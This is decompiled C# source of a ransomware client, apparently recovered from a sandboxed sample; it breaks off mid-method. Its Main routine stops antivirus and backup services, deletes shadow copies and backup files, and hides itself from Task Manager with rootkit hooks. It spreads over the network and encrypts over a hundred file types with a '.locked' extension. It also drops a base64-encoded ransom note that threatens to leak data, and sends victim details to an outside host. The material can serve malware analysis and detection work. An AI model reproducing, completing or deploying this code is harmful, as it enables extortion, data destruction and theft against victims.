// Decompiled with JetBrains decompiler
// Type: Complex.Program
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d

using Complex.cvew;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Complex
{
  internal class Program
  {
    public static string imha = "EVET";
    public static string[] files_;
    public static IEnumerable<DirectoryInfo> dirs;
    public static byte[] PasswordBytes = (byte[]) null;
    public static DirectoryInfo di;
    public static string Size = "NO";
    public static string Mb = "100000000";
    public static List<string> DizonList = new List<string>();
    public static List<string> DoneExtensions = new List<string>();
    public static string Persistence = "NO";
    public static string DynamicPass = "";
    public static string DeceiveMe = "NO";
    public static int rand = 0;
    public static string ReleaseLockedFiles = "YES";
    public static string AntiVM = "NO";
    public static string Delay = "YES";
    public static string DelayTime = "15";
    public static string DisableDefender = "NO";
    public static string DisableAMSI = "NO";
    public static string CriticalProcess = "NO";
    public static string WallpaperChanger = "NO";
    public static List<string> meltList = new List<string>()
    {
      Program.Base64Decode("bHNhc3MuZXhl"),
      Program.Base64Decode("c3ZjaHN0LmV4ZQ=="),
      Program.Base64Decode("Y3Jjc3MuZXhl"),
      Program.Base64Decode("Y2hyb21lMzIuZXhl"),
      Program.Base64Decode("ZmlyZWZveC5leGU="),
      Program.Base64Decode("Y2FsYy5leGU="),
      Program.Base64Decode("bXlzcWxkLmV4ZQ=="),
      Program.Base64Decode("ZGxsaHN0LmV4ZQ=="),
      Program.Base64Decode("b3BlcmEzMi5leGU="),
      Program.Base64Decode("bWVtb3AuZXhl"),
      Program.Base64Decode("c3Bvb2xjdi5leGU="),
      Program.Base64Decode("Y3RmbW9tLmV4ZQ=="),
      Program.Base64Decode("U2t5cGVBcHAuZXhl")
    };
    public static List<string> EncryptedDirs = new List<string>();
    public static string SpreadOverNetwork = "YES";
    public static string Live4Ever = "NO";
    public static string KillTM = "NO";
    public static List<string> EncryptedFiles = new List<string>();
    public static string FtpLog = "NO";
    private static string appGuid = "3747bdbf-0ef0-42d8-9234-70d68801f407";
    public static string MultipleThreads = "YES";
    public static string WoL = "NO";
    public static List<string> netShadowList = new List<string>()
    {
      Program.Base64Decode("c3RvcCBhdnBzdXMgL3k="),
      Program.Base64Decode("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBtZmV3YyAveQ=="),
      Program.Base64Decode("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
      Program.Base64Decode("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBEZWZXYXRjaCAveQ=="),
      Program.Base64Decode("c3RvcCBjY0V2dE1nciAveQ=="),
      Program.Base64Decode("c3RvcCBjY1NldE1nciAveQ=="),
      Program.Base64Decode("c3RvcCBTYXZSb2FtIC95"),
      Program.Base64Decode("c3RvcCBSVFZzY2FuIC95"),
      Program.Base64Decode("c3RvcCBRQkZDU2VydmljZSAveQ=="),
      Program.Base64Decode("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
      Program.Base64Decode("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBZb29CYWNrdXAgL3k="),
      Program.Base64Decode("c3RvcCBZb29JVCAveQ=="),
      Program.Base64Decode("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
      Program.Base64Decode("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
      Program.Base64Decode("c3RvcCBWU05BUFZTUyAveQ=="),
      Program.Base64Decode("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
      Program.Base64Decode("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
      Program.Base64Decode("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
      Program.Base64Decode("c3RvcCB2ZWVhbSAveQ=="),
      Program.Base64Decode("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
      Program.Base64Decode("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
      Program.Base64Decode("c3RvcCBBY3JTY2gyU3ZjIC95"),
      Program.Base64Decode("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
      Program.Base64Decode("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
      Program.Base64Decode("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
      Program.Base64Decode("c3RvcCBzb3Bob3MgL3k=")
    };
    public static List<string> scList = new List<string>()
    {
      Program.Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
      Program.Base64Decode("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
      Program.Base64Decode("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
      Program.Base64Decode("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
    };
    public static List<string> taskList = new List<string>()
    {
      Program.Base64Decode("L0lNIG1zcHViLmV4ZSAvRg=="),
      Program.Base64Decode("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
      Program.Base64Decode("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
    };
    public static List<string> vssList = new List<string>()
    {
      Program.Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
      Program.Base64Decode("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
      Program.Base64Decode("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
    };
    public static List<string> delList = new List<string>()
    {
      Program.Base64Decode("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
      Program.Base64Decode("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
      Program.Base64Decode("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
      Program.Base64Decode("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
      Program.Base64Decode("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
      Program.Base64Decode("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
    };
    public static string DelayedActivation = "NO";
    public static string ExpireOption = "NO";
    internal static DateTime ActiveAfterDateTime = new DateTime(2000, 1, 1);
    internal static DateTime ExpireAfterDateTime = new DateTime(2100, 1, 1);
    public static string PartialEncrytion = "YES";
    public static string PartialSize = "10";
    public static string StaticLooks = "YES";
    public static string SystemFiles = "NO";
    public static string RIPmeBiot = "YES";
    public static string ADMINISTRATOR = "YES";
    public static string FAC = "YES";
    public static string Styler = "NO";
    public static List<string> extstyl = new List<string>()
    {
      "docx",
      "pdf",
      "xlsx",
      "csv"
    };
    public static string LimitMe = "NO";
    public static string MaxSize = "1";
    public static string TransparentMan = "YES";
    public static string AlternateAlgo = "NO";
    public static string Jerry = "NO";
    public static string toolLocation = string.Empty;
    public static string Drag_Drop = "NO";
    public static string NotifyMe = "NO";
    public static string NotifyCustom = "NO";
    public static string LegalTitle = "";
    public static string LegalText = "";
    public static string Upper = "NO";
    public static string LANShares = "YES";
    public static string ProcessAll = "NO";
    public static string ReleaseAllFiles = "NO";
    public static string FixMBR = "NO";
    public static string LogonPass = "LOGONISOFF";
    public static string VeryBasicMode = "NO";
    public static string HorseMount = "YES";
    public static string MyStartName = "mystartup.lnk";
    public static string SkipC = "NO";
    public static string CatchDrv = "NO";
    public static string RichText = "NO";
    public static string CredActivate = "YES";
    public static string MySign = "VGhhbm9z";
    public static string Sniffing = "YES";
    public static string Blocks = "YES";

    [DllImport("kernel32.dll")]
    private static extern bool DefineDosDevice(
      uint dwFlags,
      string lpDeviceName,
      string lpTargetPath);

    [DllImport("kernel32.dll")]
    private static extern bool DeleteVolumeMountPoint(string lpszVolumeMountPoint);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern bool MoveFileExW(
      string lpExistingFileName,
      string lpNewFileName,
      uint dwFlags);

    private static void Main(string[] args)
    {
      try
      {
        MutexHelper.CheckMutex(Program.appGuid);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (Program.Sniffing == "YES")
          new Thread(new ThreadStart(AntiSniffer.SniffersKiller))
          {
            Priority = ThreadPriority.Lowest,
            IsBackground = true
          }.Start();
      }
      catch
      {
      }
      if (Program.Delay == "YES")
        Thread.Sleep(int.Parse(Program.DelayTime));
      if (Program.TransparentMan == "YES")
      {
        try
        {
          if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
          {
            string[] processesToCheck = new string[4]
            {
              Program.Base64Decode("VGFza21ncg=="),
              Program.Base64Decode("dGFza21ncg=="),
              Program.Base64Decode("UHJvY2Vzc0hhY2tlcg=="),
              Program.Base64Decode("cHJvY2V4cA==")
            };
            new Thread((ThreadStart) (() => Rootkit.WaitForProcess(processesToCheck)))
            {
              IsBackground = true
            }.Start();
          }
        }
        catch
        {
        }
        try
        {
          ROOT1.HookApplication(Program.Base64Decode("dGFza21ncg=="));
        }
        catch
        {
        }
        try
        {
          ROOT1.HookApplication(Program.Base64Decode("cHJvY2V4cA=="));
        }
        catch
        {
        }
        try
        {
          ROOT1.HookApplication(Program.Base64Decode("cHJvY2V4cDY0"));
        }
        catch
        {
        }
        try
        {
          ROOT1.HookApplication(Program.Base64Decode("UHJvY2Vzc0hhY2tlcg=="));
        }
        catch
        {
        }
        new Thread(new ThreadStart(Rootkit.Hide))
        {
          IsBackground = true
        }.Start();
      }
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && Program.FAC == "YES")
      {
        try
        {
          Program.RunPS(Program.Base64Decode("U2V0LU1wUHJlZmVyZW5jZSAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZA=="));
        }
        catch
        {
        }
      }
      if (Program.CriticalProcess == "YES" && !ProcessCritical.IsAdmin())
        ProcessCritical.YesItIs();
      if (Program.Live4Ever == "YES" && ProcessCritical.IsAdmin())
      {
        new AntiKill().DisTaskManager(false);
        new AntiKill().IamInmortal();
      }
      if (Program.AntiVM == "YES")
        Anti_Analysis.RunAntiAnalysis();
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      string fileName = mainModule.FileName;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
      string str2 = str1 + Path.GetFileName(fileName);
      if (Program.DeceiveMe == "YES" && fileName != str2)
        new Thread(new ThreadStart(Program.Deceive))
        {
          IsBackground = true,
          Priority = ThreadPriority.Highest
        }.Start();
      if (Program.Persistence == "YES" && mainModule != null)
      {
        if (fileName != str2)
        {
          try
          {
            Program.rand = Program.NextInt(0, Program.meltList.Count);
            System.IO.File.Copy(fileName, str1 + Program.meltList[Program.rand], true);
            Process.Start(str1 + Program.meltList[Program.rand]);
            Program.CleanMyStuff();
            Process.GetCurrentProcess().Kill();
          }
          catch (Exception ex)
          {
          }
        }
      }
      try
      {
        if (Program.DelayedActivation == "YES" && DateTime.Now < Program.ActiveAfterDateTime)
          return;
      }
      catch
      {
      }
      try
      {
        if (Program.ExpireOption == "YES" && DateTime.Now > Program.ExpireAfterDateTime)
          Program.CleanMyStuff();
      }
      catch
      {
      }
      foreach (string netShadow in Program.netShadowList)
        Program.ProcessCommand("net.exe", netShadow);
      foreach (string sc in Program.scList)
        Program.ProcessCommand("sc.exe", sc);
      foreach (string task in Program.taskList)
        Program.ProcessCommand("taskkill.exe", task);
      foreach (string vss in Program.vssList)
        Program.ProcessCommand(Program.Base64Decode("dnNzYWRtaW4uZXhl"), vss);
      foreach (string del in Program.delList)
        Program.ProcessCommand(Program.Base64Decode("ZGVsLmV4ZQ=="), del);
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        Program.ProcessCommand("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
      if (Program.SpreadOverNetwork == "YES" && Program.Internet() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        new Thread(new ThreadStart(NetworkSpreading.Run))
        {
          IsBackground = true
        }.Start();
      if (!(Program.WoL == "YES"))
        ;
      Program.DynamicPass = !(Program.StaticLooks == "NO") ? "3FGC7QZ13R9WNYMW1MISG70EJXK4EVFD" : Crypto.RandomString(32);
      string mykey = CryptographyHelper.Encrypt(Program.DynamicPass);
      Shortcut.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Program.MyStartName), Program.LeaveRegards(mykey), (string) null, (string) null, "Installer...", "Ctrl+Shift+X", (string) null);
      if (Program.LANShares == "YES")
      {
        try
        {
          Program.MapDrv();
        }
        catch
        {
        }
      }
      try
      {
        Program.Crypt(new string[1]{ "[auto]" }, new string[111]
        {
          "bco",
          "one",
          "dat",
          "txt",
          "vib",
          "vbm",
          "vbk",
          "jpeg",
          "gif",
          "lst",
          "tbl",
          "cdx",
          "log",
          "fpt",
          "jpg",
          "png",
          "php",
          "cs",
          "cpp",
          "rar",
          "zip",
          "html",
          "htm",
          "xlsx",
          "xls",
          "avi",
          "mp4",
          "ppt",
          "doc",
          "docx",
          "sxi",
          "sxw",
          "odt",
          "hwp",
          "tar",
          "bz2",
          "mkv",
          "eml",
          "msg",
          "ost",
          "pst",
          "edb",
          "sql",
          "accdb",
          "mdb",
          "dbf",
          "odb",
          "myd",
          "php",
          "java",
          "cpp",
          "pas",
          "asm",
          "key",
          "pfx",
          "pem",
          "p12",
          "csr",
          "gpg",
          "aes",
          "vsd",
          "odg",
          "raw",
          "nef",
          "svg",
          "psd",
          "vmx",
          "vmdk",
          "vdi",
          "lay6",
          "sqlite3",
          "sqlitedb",
          "accdb",
          "java",
          "class",
          "mpeg",
          "djvu",
          "tiff",
          "backup",
          "pdf",
          "cert",
          "docm",
          "xlsm",
          "dwg",
          "bak",
          "qbw",
          "nd",
          "tlg",
          "lgb",
          "pptx",
          "mov",
          "xdw",
          "ods",
          "wav",
          "mp3",
          "aiff",
          "flac",
          "m4a",
          "csv",
          "sql",
          "ora",
          "mdf",
          "ldf",
          "ndf",
          "dtsx",
          "rdl",
          "dim",
          "mrimg",
          "qbb",
          "rtf",
          "7z"
        }, new string[0], Program.DynamicPass, ".locked");
      }
      catch
      {
      }
      Program.DynamicPass = Crypto.RandomString(32);
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
      {
        using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
        {
          streamWriter.WriteLine(Program.Base64Decode("eW91ciBmaWxlcywgZG9jdW1lbnRzLCBhbmQgYWxsIG9mIHlvdXIgbmV0d29yayBlbmNyeXB0ZWQuDQphbGwgYmFja3VwIGRyaXZlIGFuZCB0YXBlIGRlbGV0ZWQgb2YgZm9ybWF0dGVkLg0KYWxsIHNoYWRvdyBjb3BpZXMgZGVsZXRlZC4NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KRE9OVCBSRVNUQVJUIFBDDQpET05UIFRPVUNIIE9SIEVESVQgTE9DS0VEIEZJTEVTDQpET05UIFVTRSBSRUdVTEFSIFJFQ09WRVJZIFNPRlRXQVJFLCBFVkVOICJNSUNST1NPRlQgUkVDT1ZFUlkgVE9PTCINCg0KQUxMIE9GIFRIT1NFIE5PVEVTIFdJTEwgQ0FVU0UgWU9VIExPU1QgWU9VUiBGSUxFUyBGT1IgRVZFUg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KaW1wb3J0YW50IGZpbGVzLCBkb2N1bWVudHMgYW5kIGV0YyBkb3dubG9hZGVkLCBhZnRlciBwdXJjaGFzZSB0aW1lIGlmIHlvdSBkb250IHBheSwgd2Ugd2lsbCBsZWFrIHRoZW0NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCmNvbnRhY3QgOiAwMDEwMDIwMDNAc2VjbWFpbC5wcm8="));
          streamWriter.WriteLine("\r\n");
          streamWriter.WriteLine(Program.Base64Decode("S2V5IElkZW50aWZpZXI6IA=="));
          streamWriter.WriteLine(mykey);
          if (Program.MultipleThreads == "NO")
          {
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine(Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(Program.EncryptedFiles.Count));
          }
        }
      }
      else
        System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + mykey);
      foreach (string encryptedDir in Program.EncryptedDirs)
      {
        if (!(encryptedDir == Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
        {
          try
          {
            if (!System.IO.File.Exists(encryptedDir + "\\HOW_TO_DECYPHER_FILES.txt"))
              System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", encryptedDir + "\\HOW_TO_DECYPHER_FILES.txt", true);
            else
              System.IO.File.AppendAllText(encryptedDir + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + mykey);
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (Program.RichText == "YES")
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
        {
          using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
          {
            streamWriter.WriteLine(Program.Base64Decode("MESSAGERICH"));
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine(Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
            streamWriter.WriteLine(mykey + Program.Base64Decode("PC9wPg=="));
            if (Program.MultipleThreads == "NO")
            {
              streamWriter.WriteLine("\r\n");
              streamWriter.WriteLine(Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(Program.EncryptedFiles.Count) + Program.Base64Decode("PC9wPg=="));
            }
          }
        }
        else
          System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", Program.Base64Decode("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAditional KeyId:\r\n" + mykey + Program.Base64Decode("PC9wPg=="));
      }
      if (Program.FtpLog == "YES")
      {
        try
        {
          if (Program.MultipleThreads == "NO")
          {
            string[] strArray1 = new string[14];
            strArray1[0] = Program.Base64Decode("Q2xpZW50IElQOiAg");
            strArray1[1] = new WebClient().DownloadString(Program.Base64Decode("aHR0cDovL2ljYW5oYXppcC5jb20="));
            strArray1[2] = Program.Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=");
            string[] strArray2 = strArray1;
            DateTime dateTime = new DateTime();
            dateTime = dateTime.Date;
            string str3 = dateTime.ToString();
            strArray2[3] = str3;
            strArray1[4] = "\r\n";
            strArray1[5] = Program.Base64Decode("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog");
            strArray1[6] = Convert.ToString(Program.EncryptedFiles.Count);
            strArray1[7] = "\r\n";
            strArray1[8] = Program.Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==");
            strArray1[9] = "\r\n";
            strArray1[10] = Convert.ToString((object) Program.EncryptedFiles);
            strArray1[11] = "\r\n";
            strArray1[12] = Program.Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog");
            strArray1[13] = mykey;
            UtilMe.Send(InfData: string.Concat(strArray1));
          }
          else
          {
            string[] strArray3 = new string[11];
            strArray3[0] = Program.Base64Decode("Q2xpZW50IElQOiAg");
            strArray3[1] = new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=");
            strArray3[2] = Program.Base64Decode("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=");
            string[] strArray4 = strArray3;
            DateTime dateTime = new DateTime();
            dateTime = dateTime.Date;
            string str4 = dateTime.ToString();
            strArray4[3] = str4;
            strArray3[4] = "\r\n";
            strArray3[5] = Program.Base64Decode("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==");
            strArray3[6] = "\r\n";
            strArray3[7] = Convert.ToString((object) Program.EncryptedFiles);
            strArray3[8] = "\r\n";
            strArray3[9] = Program.Base64Decode("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog");
            strArray3[10] = mykey;
            UtilMe.Send(InfData: string.Concat(strArray3));
          }
        }
        catch
        {
        }
      }
      if (Program.WallpaperChanger == "YES")
      {
        try
        {
          Wallpaper.Set(new Uri(""));
        }
        catch
        {
        }
      }
      if (Program.RichText == "NO")
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
          Process.Start(Program.Base64Decode("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
      }
      else if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
        Process.Start(Program.Base64Decode("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
      if (!string.IsNullOrEmpty(Program.toolLocation))
      {
        try
        {
          System.IO.File.Delete(Program.toolLocation);
        }
        catch
        {
        }
      }
      if (!(Program.imha == "EVET"))
        return;
      Program.CleanMyStuff();
    }

    public static void Deceive()
    {
      int num = (int) MessageBox.Show(Program.Base64Decode("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), Program.Base64Decode("QXRlbnRpb24h"), MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private static int NextInt(int min, int max)
    {
      RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
      byte[] data = new byte[4];
      cryptoServiceProvider.GetBytes(data);
      return new Random(BitConverter.ToInt32(data, 0)).Next(min, max);
    }

    public static List<string> TraverseTree(
      string root,
      string[] extensions,
      string extension,
      string[] excluded,
      string DynamicPass)
    {
      List<string> files1 = new List<string>();
      Stack<string> stringStack = new Stack<string>(20);
      stringStack.Push(root);
      while (stringStack.Count > 0)
      {
        string path = stringStack.Pop();
        string[] directories;
        try
        {
          directories = Directory.GetDirectories(path);
        }
        catch
        {
          continue;
        }
        string[] files2;
        try
        {
          if (!path.ToLower().Contains("program files") && !path.ToLower().Contains("windows") && !path.ToLower().Contains("perflogs") && !path.ToLower().Contains("internet explorer") && !path.ToLower().Contains("programdata") && !path.ToLower().Contains("appdata"))
            files2 = Directory.GetFiles(path);
          else
            continue;
        }
        catch
        {
          continue;
        }
        foreach (string fileName in files2)
        {
          try
          {
            FileInfo fileInfo = new FileInfo(fileName);
            if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(Program.Base64Decode("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") && !fileInfo.FullName.EndsWith(".locked") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(Program.MyStartName))
            {
              if (System.IO.File.Exists(fileInfo.FullName) && (double) fileInfo.Length <= double.Parse(Program.Mb) * 1024.0 * 1024.0 && Program.Size == "YES")
              {
                files1.Add(fileInfo.FullName);
                Program.WorkerCrypter2(files1, extensions, extension, excluded, DynamicPass);
                files1.Clear();
              }
              else if (System.IO.File.Exists(fileInfo.FullName) && Program.Size == "NO")
              {
                files1.Add(fileInfo.FullName);
